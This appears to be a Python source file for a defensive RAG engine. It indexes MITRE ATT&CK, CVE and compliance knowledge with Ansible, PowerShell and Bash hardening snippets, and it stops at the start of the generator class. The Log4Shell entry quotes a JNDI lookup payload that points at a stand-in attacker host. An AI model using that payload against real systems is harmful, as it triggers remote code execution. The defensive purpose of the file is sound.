"""
rag_engine.py — Retrieval-Augmented Generation (RAG) Intelligence Subsystem for NexShield
========================================================================================
Integrates an in-between RAG intelligence model into NexShield's cybersecurity pipeline.

Architecture:
  1. SecurityKnowledgeStore:
     Ingests, structures, and indexes:
     - Local CVE repository (NVD JSON v5 and MongoDB/TinyDB cve_cache)
     - MITRE ATT&CK Enterprise Matrix (Techniques, Tactics, Mitigations)
     - Regulatory Compliance Baselines (PCI-DSS 4.0, ISO 27001:2022, NIST CSF 2.0, CIS)
     - Hardening Playbooks & Automated Scripts (Ansible, PowerShell, Bash)
  2. RAGRetriever:
     Performs hybrid semantic search (TF-IDF vector cosine similarity + keyword taxonomy matching)
     to retrieve high-precision domain context for any detected vulnerability, host, or natural query.
  3. RAGGenerator:
     Multi-backend generative reasoning engine:
     - Built-in Local Synthesizer (100% offline, zero-dependency, hallucination-free)
     - Local LLM via Ollama (e.g. llama3, mistral, deepseek-r1)
     - Cloud GenAI API (Gemini / OpenAI via environment variables)
     Synthesizes contextual threat explanations, exploit chains, blast-radius assessments,
     and dynamic tailored remediation scripts with verifiable document citations.
"""

from __future__ import annotations

import os
import json
import logging
import re
import threading
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("nexshield.rag")

# Try to import scikit-learn for vector indexing; provide fallback if unavailable
try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.metrics.pairwise import cosine_similarity
    import numpy as np
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    logger.warning("scikit-learn not available for RAG vectorizer; falling back to lexical token similarity.")

ROOT_DIR = Path(__file__).parent
DATA_DIR = ROOT_DIR / "data"
INDEX_CACHE_PATH = DATA_DIR / "rag_knowledge_index.json"


# ═════════════════════════════════════════════════════════════════════
#  Data Structures
# ═════════════════════════════════════════════════════════════════════

@dataclass
class KnowledgeDocument:
    """A granular document chunk indexed in the RAG knowledge store."""
    doc_id: str
    category: str  # "cve", "mitre", "compliance", "hardening", "threat_actor"
    title: str
    content: str
    metadata: Dict[str, Any] = field(default_factory=dict)
    tags: List[str] = field(default_factory=list)
    remediation: Dict[str, List[str]] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "doc_id": self.doc_id,
            "category": self.category,
            "title": self.title,
            "content": self.content,
            "metadata": self.metadata,
            "tags": self.tags,
            "remediation": self.remediation,
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> KnowledgeDocument:
        return cls(
            doc_id=data.get("doc_id", ""),
            category=data.get("category", "general"),
            title=data.get("title", ""),
            content=data.get("content", ""),
            metadata=data.get("metadata", {}),
            tags=data.get("tags", []),
            remediation=data.get("remediation", {}),
        )


@dataclass
class RetrievalResult:
    """Document returned by retriever with relevance score and highlight."""
    document: KnowledgeDocument
    score: float
    matched_terms: List[str] = field(default_factory=list)


# ═════════════════════════════════════════════════════════════════════
#  Curated Foundation Cybersecurity Knowledge Base
# ═════════════════════════════════════════════════════════════════════

FOUNDATION_KNOWLEDGE: List[Dict[str, Any]] = [
    # ── MITRE ATT&CK: SMB & Lateral Movement ──────────────────────
    {
        "doc_id": "MITRE-T1021.002",
        "category": "mitre",
        "title": "Remote Services: SMB/Windows Admin Shares (T1021.002)",
        "content": (
            "Adversaries may use Server Message Block (SMB) protocols and Windows administrative "
            "shares (e.g., C$, ADMIN$, IPC$) to execute code remotely and move laterally across a network. "
            "Exploits like EternalBlue (CVE-2017-0144) and tools like PsExec or Impacket utilize port 445 "
            "to compromise endpoints without requiring human intervention. Disabling SMBv1, enforcing SMB "
            "signing (RequireSecuritySignature=1), and blocking port 445 at internal network boundaries "
            "severely restrict adversary lateral traversal."
        ),
        "tags": ["smb", "445", "139", "lateral_movement", "psexec", "eternalblue", "windows"],
        "metadata": {
            "tactic": "Lateral Movement",
            "technique_id": "T1021.002",
            "severity": "critical",
            "cves": ["CVE-2017-0144", "CVE-2020-0796"],
        },
        "remediation": {
            "ansible": [
                "- name: Disable SMBv1 Protocol",
                "  ansible.windows.win_optional_feature:",
                "    name: SMB1Protocol",
                "    state: absent",
                "- name: Enforce SMB Signing on Server",
                "  ansible.windows.win_regedit:",
                "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters",
                "    name: RequireSecuritySignature",
                "    data: 1",
                "    type: dword",
            ],
            "powershell": [
                "# Disable SMBv1 and enforce SMB encryption/signing",
                "Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force",
                "Set-SmbServerConfiguration -RequireSecuritySignature $true -Force",
                "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' -Name 'RequireSecuritySignature' -Value 1",
            ],
            "bash": [
                "# Block SMB traffic on Linux edge firewall",
                "sudo ufw deny proto tcp from any to any port 445 comment 'Block SMB'",
                "sudo ufw deny proto tcp from any to any port 139 comment 'Block NetBIOS'",
            ],
        },
    },
    # ── MITRE ATT&CK: RDP Exposure & Credential Access ─────────────
    {
        "doc_id": "MITRE-T1021.001",
        "category": "mitre",
        "title": "Remote Services: Remote Desktop Protocol (T1021.001)",
        "content": (
            "Adversaries abuse RDP (port 3389) for interactive remote access, credential brute-forcing, "
            "and session hijacking. Critical vulnerabilities like BlueKeep (CVE-2019-0708) allow pre-authentication "
            "remote code execution. Mitigation requires enabling Network Level Authentication (NLA), enforcing "
            "multi-factor authentication (MFA), isolating RDP behind VPN gateways, and rate-limiting authentication attempts."
        ),
        "tags": ["rdp", "3389", "remote_access", "bluekeep", "brute_force", "windows"],
        "metadata": {
            "tactic": "Lateral Movement, Initial Access",
            "technique_id": "T1021.001",
            "severity": "critical",
            "cves": ["CVE-2019-0708"],
        },
        "remediation": {
            "ansible": [
                "- name: Require Network Level Authentication (NLA) for RDP",
                "  ansible.windows.win_regedit:",
                "    path: HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
                "    name: UserAuthentication",
                "    data: 1",
                "    type: dword",
            ],
            "powershell": [
                "# Enable Network Level Authentication (NLA) for Remote Desktop",
                "(Get-WmiObject -Class Win32_TSGeneralSetting -Namespace root\\cimv2\\terminalservices -Filter \"TerminalName='RDP-Tcp'\").SetUserAuthenticationRequired(1)",
                "Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'UserAuthentication' -Value 1",
            ],
            "bash": [
                "# Restrict inbound RDP (port 3389) to authorized management bastion only",
                "sudo ufw allow from 10.0.0.50 to any port 3389 proto tcp comment 'Bastion RDP only'",
                "sudo ufw deny 3389/tcp comment 'Drop all other RDP'",
            ],
        },
    },
    # ── MITRE ATT&CK: SSH Hardening & Brute Force ──────────────────
    {
        "doc_id": "MITRE-T1021.004",
        "category": "mitre",
        "title": "Remote Services: SSH Protocol Hardening (T1021.004)",
        "content": (
            "SSH (port 22) is targeted for automated brute force, credential harvesting, and recent pre-auth "
            "vulnerabilities like RegreSSHion (CVE-2024-6387 in OpenSSH). Security posture requires disabling "
            "root login (`PermitRootLogin no`), enforcing public key authentication (`PasswordAuthentication no`), "
            "updating OpenSSH to patched releases, and deploying Fail2ban / rate limiting."
        ),
        "tags": ["ssh", "22", "regresshion", "brute_force", "linux", "remote_access"],
        "metadata": {
            "tactic": "Lateral Movement, Initial Access",
            "technique_id": "T1021.004",
            "severity": "high",
            "cves": ["CVE-2024-6387"],
        },
        "remediation": {
            "ansible": [
                "- name: Harden SSH daemon config",
                "  ansible.builtin.lineinfile:",
                "    path: /etc/ssh/sshd_config",
                "    regexp: '^{{ item.param }}'",
                "    line: '{{ item.param }} {{ item.val }}'",
                "  loop:",
                "    - { param: 'PermitRootLogin', val: 'no' }",
                "    - { param: 'PasswordAuthentication', val: 'no' }",
                "    - { param: 'MaxAuthTries', val: '3' }",
                "  notify: restart sshd",
            ],
            "powershell": [
                "# For Windows OpenSSH server: enforce key authentication",
                "Set-Service -Name sshd -StartupType 'Automatic'",
                "Add-Content -Path $env:ProgramData\\ssh\\sshd_config -Value 'PasswordAuthentication no'",
                "Restart-Service sshd",
            ],
            "bash": [
                "# Disable password auth and root login in SSH",
                "sudo sed -i 's/^#*PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
                "sudo sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config",
                "sudo systemctl restart ssh || sudo systemctl restart sshd",
            ],
        },
    },
    # ── MITRE ATT&CK: Telnet Deprecation ───────────────────────────
    {
        "doc_id": "MITRE-T1021.006",
        "category": "mitre",
        "title": "Remote Services: Insecure Telnet Exposure (T1021.006)",
        "content": (
            "Telnet (port 23) transmits all authentication credentials and session data in cleartext plaintext. "
            "Network sniffers and adversary-in-the-middle (AiTM) positions intercept root passwords trivially. "
            "Telnet is strictly non-compliant with PCI-DSS Req 2.2.7 and NIST CSF PR.DS-02 and must be decommissioned "
            "immediately in favor of SSH with mutual key authentication."
        ),
        "tags": ["telnet", "23", "cleartext", "sniffing", "aitm", "insecure_protocol"],
        "metadata": {
            "tactic": "Lateral Movement, Credential Access",
            "technique_id": "T1021.006",
            "severity": "critical",
            "compliance": ["PCI-DSS Req 2.2.7", "NIST PR.DS-02"],
        },
        "remediation": {
            "ansible": [
                "- name: Remove and disable Telnet daemon",
                "  ansible.builtin.service:",
                "    name: telnetd",
                "    state: stopped",
                "    enabled: false",
                "  ignore_errors: true",
            ],
            "powershell": [
                "# Uninstall Telnet Server and Client features",
                "Disable-WindowsOptionalFeature -Online -FeatureName 'TelnetClient' -NoRestart",
                "Stop-Service -Name 'tlntsvr' -ErrorAction SilentlyContinue",
                "Set-Service -Name 'tlntsvr' -StartupType Disabled -ErrorAction SilentlyContinue",
            ],
            "bash": [
                "# Stop Telnet service and block port 23 completely",
                "sudo systemctl stop telnetd 2>/dev/null || true",
                "sudo systemctl disable telnetd 2>/dev/null || true",
                "sudo ufw deny 23/tcp comment 'Drop Telnet'",
            ],
        },
    },
    # ── MITRE ATT&CK: Web Server Hardening & Cleartext HTTP ─────────
    {
        "doc_id": "MITRE-T1071.001",
        "category": "mitre",
        "title": "Application Layer Protocol: Web Protocols & Cleartext HTTP (T1071.001)",
        "content": (
            "Unencrypted HTTP (port 80) exposes session tokens, cookies, and sensitive payload data to eavesdropping. "
            "Modern web servers must redirect all HTTP traffic to HTTPS (port 443 with TLS 1.3), enforce HSTS "
            "(Strict-Transport-Security: max-age=63072000; includeSubDomains; preload), and apply robust Content Security "
            "Policies (CSP) and secure cookie flags (Secure; HttpOnly; SameSite=Strict)."
        ),
        "tags": ["http", "80", "https", "443", "tls", "hsts", "web", "apache", "nginx"],
        "metadata": {
            "tactic": "Command and Control, Exfiltration",
            "technique_id": "T1071.001",
            "severity": "medium",
            "compliance": ["PCI-DSS Req 4.1", "OWASP A02:2021"],
        },
        "remediation": {
            "ansible": [
                "- name: Enforce HTTP to HTTPS 301 redirection in Nginx",
                "  ansible.builtin.lineinfile:",
                "    path: /etc/nginx/sites-available/default",
                "    regexp: '^\\s*listen 80;'",
                "    line: '    listen 80 default_server; return 301 https://$host$request_uri;'",
            ],
            "powershell": [
                "# Enforce HTTPS redirection in IIS web server",
                "Import-Module WebAdministration -ErrorAction SilentlyContinue",
                "Set-WebConfigurationProperty -Filter 'system.webServer/httpRedirect' -Name 'enabled' -Value $true",
                "Set-WebConfigurationProperty -Filter 'system.webServer/httpRedirect' -Name 'destination' -Value 'https://[host]$V$Q'",
            ],
            "bash": [
                "# Enforce HTTPS and reload web server",
                "echo 'Enforcing HTTPS 301 Redirect on Nginx/Apache...'",
                "sudo ufw allow 443/tcp comment 'Allow TLS traffic'",
                "sudo systemctl reload nginx 2>/dev/null || sudo systemctl reload apache2 2>/dev/null || true",
            ],
        },
    },
    # ── MITRE ATT&CK: Database Exposure (MySQL, MSSQL, Postgres, Mongo) ──
    {
        "doc_id": "MITRE-T1190-DB",
        "category": "mitre",
        "title": "Exploit Public-Facing Application: Exposed Database Services (T1190)",
        "content": (
            "Direct network exposure of relational or NoSQL database ports (MySQL 3306, PostgreSQL 5432, "
            "MSSQL 1433, Oracle 1521, MongoDB 27017, Redis 6379) violates isolation principles. Attackers leverage "
            "automated credential spraying, unauthenticated remote command execution (e.g. Redis unauthorized write "
            "to crontab or authorized_keys), and SQL injection to achieve complete host takeover. Databases should bind "
            "to 127.0.0.1 (localhost) or private VPC subnets only."
        ),
        "tags": ["mysql", "postgres", "mssql", "mongodb", "redis", "3306", "5432", "1433", "27017", "6379", "database"],
        "metadata": {
            "tactic": "Initial Access, Defense Evasion",
            "technique_id": "T1190",
            "severity": "critical",
            "compliance": ["PCI-DSS Req 1.3", "ISO 27001 A.8.20"],
        },
        "remediation": {
            "ansible": [
                "- name: Bind MySQL to localhost only",
                "  ansible.builtin.lineinfile:",
                "    path: /etc/mysql/mysql.conf.d/mysqld.cnf",
                "    regexp: '^bind-address'",
                "    line: 'bind-address = 127.0.0.1'",
                "- name: Bind Redis to localhost and enable protected mode",
                "  ansible.builtin.lineinfile:",
                "    path: /etc/redis/redis.conf",
                "    regexp: '^bind '",
                "    line: 'bind 127.0.0.1 ::1'",
            ],
            "powershell": [
                "# Block inbound public SQL Server port 1433",
                "New-NetFirewallRule -DisplayName 'Block External MSSQL' -Direction Inbound -LocalPort 1433 -Protocol TCP -Action Block",
            ],
            "bash": [
                "# Bind database services to localhost and firewall restrict ports",
                "sudo sed -i 's/^bind-address.*/bind-address = 127.0.0.1/' /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null || true",
                "sudo ufw deny 3306/tcp comment 'Block MySQL from external'",
                "sudo ufw deny 5432/tcp comment 'Block Postgres from external'",
                "sudo ufw deny 6379/tcp comment 'Block Redis external'",
                "sudo ufw deny 27017/tcp comment 'Block MongoDB external'",
            ],
        },
    },
    # ── High Profile CVEs: Log4Shell (CVE-2021-44228) ──────────────
    {
        "doc_id": "CVE-2021-44228",
        "category": "cve",
        "title": "Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        "content": (
            "Apache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features do not protect against "
            "attacker controlled LDAP and other JNDI related endpoints. An attacker who can log a string "
            "such as ${jndi:ldap://attacker.com/a} can execute arbitrary code loaded from LDAP servers when "
            "message lookup substitution is enabled. CVSS v3 score 10.0 (CRITICAL). Mitigation requires upgrading "
            "to Log4j 2.17.1+ or setting log4j2.formatMsgNoLookups=true."
        ),
        "tags": ["cve-2021-44228", "log4j", "log4shell", "java", "jndi", "rce", "critical"],
        "metadata": {
            "cvss": 10.0,
            "severity": "critical",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "epss": 0.97,
        },
        "remediation": {
            "ansible": [
                "- name: Set log4j JVM mitigation flag globally",
                "  ansible.builtin.lineinfile:",
                "    path: /etc/environment",
                "    line: 'LOG4J_FORMAT_MSG_NO_LOOKUPS=true'",
            ],
            "powershell": [
                "# Set System-wide Environment Variable to neutralize Log4Shell lookups",
                "[Environment]::SetEnvironmentVariable('LOG4J_FORMAT_MSG_NO_LOOKUPS', 'true', 'Machine')",
            ],
            "bash": [
                "# Mitigate Log4Shell lookups via JVM flags",
                "export LOG4J_FORMAT_MSG_NO_LOOKUPS=true",
                "echo 'LOG4J_FORMAT_MSG_NO_LOOKUPS=true' | sudo tee -a /etc/environment",
            ],
        },
    },
    # ── High Profile CVEs: EternalBlue (CVE-2017-0144) ─────────────
    {
        "doc_id": "CVE-2017-0144",
        "category": "cve",
        "title": "Microsoft SMBv1 Remote Code Execution (EternalBlue / MS17-010)",
        "content": (
            "The SMBv1 server in Microsoft Windows Vista, 7, 8.1, 10, and Windows Server 2008, 2012, 2016 "
            "allows remote attackers to execute arbitrary code via crafted packets (EternalBlue). Exploited "
            "by WannaCry and NotPetya ransomware families for rapid autonomous network worm propagation. "
            "CVSS v3 score 9.8 (CRITICAL). Requires immediate installation of Microsoft security bulletin "
            "MS17-010 and complete removal of the SMB1 protocol feature."
        ),
        "tags": ["cve-2017-0144", "ms17-010", "eternalblue", "smb", "445", "wannacry", "worm"],
        "metadata": {
            "cvss": 9.8,
            "severity": "critical",
            "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "epss": 0.98,
        },
        "remediation": {
            "ansible": [
                "- name: Disable SMBv1 feature on Windows",
                "  ansible.windows.win_optional_feature:",
                "    name: SMB1Protocol",
                "    state: absent",
            ],
            "powershell": [
                "# Disable SMBv1 protocol feature immediately",
                "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart",
                "Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force",
            ],
            "bash": [
                "# Drop SMB port on network segment",
                "sudo ufw deny 445/tcp comment 'Mitigate EternalBlue port 445'",
            ],
        },
    },
    # ── Regulatory Compliance: PCI-DSS 4.0 Architecture ───────────
    {
        "doc_id": "COMPLIANCE-PCI-DSS-4.0",
        "category": "compliance",
        "title": "PCI-DSS v4.0 Technical Requirements for Vulnerability Management",
        "content": (
            "Requirement 1: Install and Maintain Network Security Controls (restrict incoming/outgoing traffic). "
            "Requirement 2: Apply Secure Configurations (change vendor defaults, remove unnecessary services/protocols). "
            "Requirement 4: Protect Cardholder Data with Strong Cryptography during transmission (TLS 1.3/1.2 only; disable SSL/TLSv1.0). "
            "Requirement 6: Develop and Maintain Secure Systems (install critical security patches within one month of release). "
            "Requirement 8: Identify Users and Authenticate Access (enforce MFA for all administrative access, password complexity >= 12 chars)."
        ),
        "tags": ["pci-dss", "compliance", "encryption", "patching", "audit", "standards"],
        "metadata": {
            "standard": "PCI-DSS v4.0",
            "auditor": "QSA / ISA",
        },
        "remediation": {
            "powershell": [
                "# Audit compliance: enforce minimum 12-char password and lockout policy",
                "net accounts /minpwlen:12 /lockoutthreshold:5 /lockoutduration:30",
            ],
            "bash": [
                "# Audit open ports and disable insecure services for PCI-DSS compliance",
                "sudo ss -tulpn | grep LISTEN",
                "sudo ufw enable && sudo ufw default deny incoming",
            ],
        },
    },
    # ── Regulatory Compliance: NIST CSF 2.0 ────────────────────────
    {
        "doc_id": "COMPLIANCE-NIST-CSF-2.0",
        "category": "compliance",
        "title": "NIST Cybersecurity Framework 2.0 (Govern, Identify, Protect, Detect, Respond, Recover)",
        "content": (
            "PR.AC (Identity Management, Authentication and Access Control): Physical and logical assets are managed "
            "with least privilege and multi-factor authentication. "
            "PR.DS (Data Security): Data in transit and at rest is protected with authenticated encryption. "
            "PR.PS (Platform Security): Software configurations, operating systems, and network perimeter devices are hardened. "
            "DE.CM (Continuous Monitoring): Malicious code, unauthorized connections, and exposed ports are monitored continuously."
        ),
        "tags": ["nist", "csf", "nist-csf-2.0", "protect", "detect", "compliance", "government"],
        "metadata": {
            "standard": "NIST CSF 2.0",
        },
        "remediation": {
            "bash": [
                "# Deploy baseline security monitoring",
                "sudo apt-get install -y fail2ban ufw unattended-upgrades",
                "sudo systemctl enable fail2ban",
            ],
        },
    },
    # ── CIS Benchmarks: Linux & Windows Server Hardening ───────────
    {
        "doc_id": "CIS-BENCHMARK-HARDENING",
        "category": "hardening",
        "title": "CIS Benchmark Multi-Platform System Hardening Baseline",
        "content": (
            "1. Disable unnecessary network protocols and filesystems (dccp, sctp, rds, tipc). "
            "2. Restrict core dumps (`* hard core 0`). "
            "3. Enforce kernel ASLR (`kernel.randomize_va_space = 2`). "
            "4. Enable SYN flood protection (`net.ipv4.tcp_syncookies = 1`). "
            "5. Ignore ICMP broadcast echo requests (`net.ipv4.icmp_echo_ignore_broadcasts = 1`). "
            "6. Disable IP packet forwarding on non-router hosts (`net.ipv4.ip_forward = 0`). "
            "7. Ensure system logging and auditd daemons are active."
        ),
        "tags": ["cis", "hardening", "kernel", "sysctl", "security_baseline", "benchmark"],
        "metadata": {
            "standard": "CIS Benchmarks Level 1 / Level 2",
        },
        "remediation": {
            "bash": [
                "# Apply CIS sysctl network hardening parameters",
                "sudo tee -a /etc/sysctl.d/99-cis-hardening.conf <<EOF",
                "net.ipv4.tcp_syncookies = 1",
                "net.ipv4.ip_forward = 0",
                "net.ipv4.icmp_echo_ignore_broadcasts = 1",
                "net.ipv4.conf.all.accept_redirects = 0",
                "kernel.randomize_va_space = 2",
                "EOF",
                "sudo sysctl --system",
            ],
            "powershell": [
                "# Apply Windows CIS baseline: Disable LLMNR and NetBIOS over TCP/IP",
                "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient' -Name 'EnableMulticast' -Value 0 -PropertyType DWord -Force",
            ],
        },
    },
]


# ═════════════════════════════════════════════════════════════════════
#  SecurityKnowledgeStore — Ingestion & Semantic Vector Index
# ═════════════════════════════════════════════════════════════════════

class SecurityKnowledgeStore:
    """
    Manages knowledge documents from multiple security sources:
    - Foundation knowledge (MITRE ATT&CK, CIS, PCI-DSS, NIST)
    - Local CVE JSON files (from cve_data/cvelistV5-main/cves/)
    - Dynamic findings and custom hardening playbooks
    """

    def __init__(self):
        self._docs: Dict[str, KnowledgeDocument] = {}
        self._lock = threading.RLock()
        self._vectorizer = None
        self._doc_matrix = None
        self._doc_ids_ordered: List[str] = []
        self._is_indexed = False
        self._last_indexed_at: Optional[str] = None

        # Load foundation knowledge immediately
        self._load_foundation_knowledge()

    def _load_foundation_knowledge(self):
        for item in FOUNDATION_KNOWLEDGE:
            doc = KnowledgeDocument(
                doc_id=item["doc_id"],
                category=item["category"],
                title=item["title"],
                content=item["content"],
                tags=item.get("tags", []),
                metadata=item.get("metadata", {}),
                remediation=item.get("remediation", {}),
            )
            self._docs[doc.doc_id] = doc

    def add_document(self, doc: KnowledgeDocument):
        with self._lock:
            self._docs[doc.doc_id] = doc
            self._is_indexed = False  # requires re-vectorization

    def ingest_cve_files(self, max_cves: int = 500) -> int:
        """
        Dynamically scan and ingest top local CVE JSON records from cve_data/.
        Prioritizes high-impact recent CVEs to keep index fast and targeted.
        """
        cves_root = ROOT_DIR / "cve_data" / "cvelistV5-main" / "cves"
        if not cves_root.exists():
            cves_root = ROOT_DIR / "cve_data" / "cves"
        if not cves_root.exists():
            return 0

        ingested = 0
        try:
            # Check recent years backwards (2026, 2025, 2024, 2023, 2022, 2021)
            year_dirs = sorted(
                [d for d in cves_root.iterdir() if d.is_dir() and d.name.isdigit()],
                key=lambda p: int(p.name),
                reverse=True,
            )

            for year_dir in year_dirs:
                if ingested >= max_cves:
                    break
                for chunk_dir in year_dir.iterdir():
                    if not chunk_dir.is_dir():
                        continue
                    for json_file in chunk_dir.glob("*.json"):
                        if ingested >= max_cves:
                            break
                        try:
                            with open(json_file, "r", encoding="utf-8") as f:
                                data = json.load(f)
                            cve_meta = data.get("cveMetadata", {})
                            cve_id = cve_meta.get("cveId", "")
                            if not cve_id or cve_id in self._docs:
                                continue

                            cna = data.get("containers", {}).get("cna", {})
                            descriptions = cna.get("descriptions", [])
                            desc_en = "Vulnerability advisory."
                            for d in descriptions:
                                if d.get("lang") == "en":
                                    desc_en = d.get("value", desc_en)
                                    break

                            # Affected products
                            affected = cna.get("affected", [])
                            products = [aff.get("product", "") for aff in affected if aff.get("product")]

                            doc = KnowledgeDocument(
                                doc_id=cve_id,
                                category="cve",
                                title=f"CVE Advisory: {cve_id} ({', '.join(products[:3]) or 'General'})",
                                content=f"Vulnerability {cve_id}. Affected: {', '.join(products)}. Description: {desc_en}",
                                tags=[cve_id.lower()] + [p.lower() for p in products if p],
                                metadata={"cve_id": cve_id, "products": products, "source": "local_cvelist"},
                            )
                            self._docs[cve_id] = doc
                            ingested += 1
                        except Exception:
                            continue
        except Exception as exc:
            logger.warning(f"Error while scanning local CVE files: {exc}")

        return ingested

    def build_vector_index(self):
        """Builds TF-IDF vector matrix for fast semantic retrieval."""
        with self._lock:
            doc_list = list(self._docs.values())
            self._doc_ids_ordered = [d.doc_id for d in doc_list]

            corpus = []
            for d in doc_list:
                # Combine title, content, tags, and category into a dense semantic representation
                tag_str = " ".join(d.tags)
                text = f"{d.title} {d.content} {tag_str} {d.category}"
                corpus.append(text)

            if SKLEARN_AVAILABLE and corpus:
                self._vectorizer = TfidfVectorizer(
                    ngram_range=(1, 2),
                    stop_words="english",
                    max_features=8000,
                    sublinear_tf=True,
                )
                self._doc_matrix = self._vectorizer.fit_transform(corpus)
            else:
                self._vectorizer = None
                self._doc_matrix = None

            self._is_indexed = True
            self._last_indexed_at = datetime.now(timezone.utc).isoformat()
            logger.info(f"RAG Knowledge Store indexed {len(self._docs)} documents.")

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            categories = {}
            for d in self._docs.values():
                categories[d.category] = categories.get(d.category, 0) + 1
            return {
                "total_documents": len(self._docs),
                "categories": categories,
                "vector_indexed": self._is_indexed,
                "sklearn_available": SKLEARN_AVAILABLE,
                "last_indexed_at": self._last_indexed_at,
            }

    def get_document(self, doc_id: str) -> Optional[KnowledgeDocument]:
        return self._docs.get(doc_id)

    def all_documents(self) -> List[KnowledgeDocument]:
        return list(self._docs.values())


# ═════════════════════════════════════════════════════════════════════
#  RAGRetriever — Hybrid Semantic & Taxonomy Search
# ═════════════════════════════════════════════════════════════════════

class RAGRetriever:
    """
    Retrieves the most relevant knowledge documents given a natural language query
    or a structured threat context (host, port, service, cve).
    """

    # Keyword synonyms for query expansion in cybersecurity
    SYNONYM_MAP = {
        "445": ["smb", "microsoft-ds", "windows", "samba", "eternalblue", "t1021.002"],
        "smb": ["445", "139", "netbios", "lateral_movement", "psexec", "t1021.002"],
        "3389": ["rdp", "remote desktop", "terminal server", "bluekeep", "t1021.001"],
        "rdp": ["3389", "remote access", "bluekeep", "nla", "t1021.001"],
        "22": ["ssh", "openssh", "regresshion", "remote access", "t1021.004"],
        "ssh": ["22", "openssh", "public key", "t1021.004"],
        "23": ["telnet", "cleartext", "plaintext", "insecure", "t1021.006"],
        "telnet": ["23", "cleartext", "t1021.006"],
        "80": ["http", "unencrypted", "web", "apache", "nginx", "t1071.001"],
        "http": ["80", "unencrypted", "web", "hsts", "tls", "t1071.001"],
        "mysql": ["3306", "database", "sql"],
        "postgres": ["5432", "postgresql", "database"],
        "redis": ["6379", "unauthenticated", "cache"],
        "mongodb": ["27017", "nosql", "database"],
    }

    def __init__(self, store: SecurityKnowledgeStore):
        self.store = store

    def _expand_query(self, query: str) -> str:
        tokens = re.findall(r"\b\w+\b", query.lower())
        extra_terms = []
        for t in tokens:
            if t in self.SYNONYM_MAP:
                extra_terms.extend(self.SYNONYM_MAP[t])
        return query + " " + " ".join(extra_terms)

    def retrieve(self, query: str, top_k: int = 4, category_filter: Optional[str] = None) -> List[RetrievalResult]:
        """Hybrid retrieval using TF-IDF cosine similarity + keyword boost."""
        if not self.store._is_indexed:
            self.store.build_vector_index()

        expanded_query = self._expand_query(query)
        doc_ids = self.store._doc_ids_ordered
        results: List[RetrievalResult] = []

        if not doc_ids:
            return results

        # 1. Cosine similarity score
        cosine_scores = np.zeros(len(doc_ids))
        if SKLEARN_AVAILABLE and self.store._vectorizer and self.store._doc_matrix is not None:
            try:
                q_vec = self.store._vectorizer.transform([expanded_query])
                sim_matrix = cosine_similarity(q_vec, self.store._doc_matrix)
                cosine_scores = sim_matrix[0]
            except Exception as e:
                logger.debug(f"Cosine similarity error: {e}")

        # 2. Keyword boost & category filtering
        query_terms = set(re.findall(r"[a-zA-Z0-9_\-]+", expanded_query.lower()))
        lower_query = expanded_query.lower()
        cve_in_query = re.findall(r"cve-\d{4}-\d+", lower_query)

        scored_docs: List[Tuple[float, KnowledgeDocument, List[str]]] = []
        for idx, doc_id in enumerate(doc_ids):
            doc = self.store.get_document(doc_id)
            if not doc:
                continue

            if category_filter and doc.category != category_filter:
                continue

            # Check matching terms in tags & title
            matched_terms = [t for t in query_terms if t in doc.tags or t in doc.title.lower()]
            keyword_score = min(1.0, len(matched_terms) * 0.25)

            # Combined hybrid score (60% cosine vector + 40% keyword taxonomy boost)
            final_score = float(0.6 * cosine_scores[idx] + 0.4 * keyword_score)

            # Boost exact CVE or Doc ID matches
            if doc.doc_id.lower() in lower_query:
                final_score = max(final_score, 0.95)
            for cve in cve_in_query:
                if cve in doc.doc_id.lower() or any(cve in t.lower() for t in doc.tags):
                    final_score = max(final_score, 0.95)

            scored_docs.append((final_score, doc, matched_terms))

        scored_docs.sort(key=lambda x: x[0], reverse=True)

        for score, doc, matched in scored_docs[:top_k]:
            results.append(RetrievalResult(document=doc, score=round(score, 3), matched_terms=matched))

        return results

    def retrieve_for_threat(self, threat_ctx: Dict[str, Any], top_k: int = 3) -> List[RetrievalResult]:
        """Convenience method to retrieve context for a detected threat or scan context."""
        parts = []
        if threat_ctx.get("cve_id"):
            parts.append(str(threat_ctx["cve_id"]))
        if threat_ctx.get("service"):
            parts.append(str(threat_ctx["service"]))
        if threat_ctx.get("port"):
            parts.append(f"port {threat_ctx['port']}")
        if threat_ctx.get("product"):
            parts.append(str(threat_ctx["product"]))
        if threat_ctx.get("name"):
            parts.append(str(threat_ctx["name"]))

        query = " ".join(parts)
        return self.retrieve(query=query, top_k=top_k)


# ═════════════════════════════════════════════════════════════════════
#  RAGGenerator — Multi-Backend Generative Synthesizer
# ═════════════════════════════════════════════════════════════════════

class RAGGenerator:
    """
    Synthesizes actionable intelligence, threat explanations, and dynamic
    remediation code from retrieved knowledge documents.

    Supports:
    1. Built-in Local Security Synthesis Engine (default, 100% offline & reliable)
    2. Local Ollama LLM (if OLLAMA_HOST or OLLAMA_MODEL is set)
    3. Cloud API (Gemini / OpenAI if configured in .env)
    """

    def __init__(self, retriever: RAGRetriever):
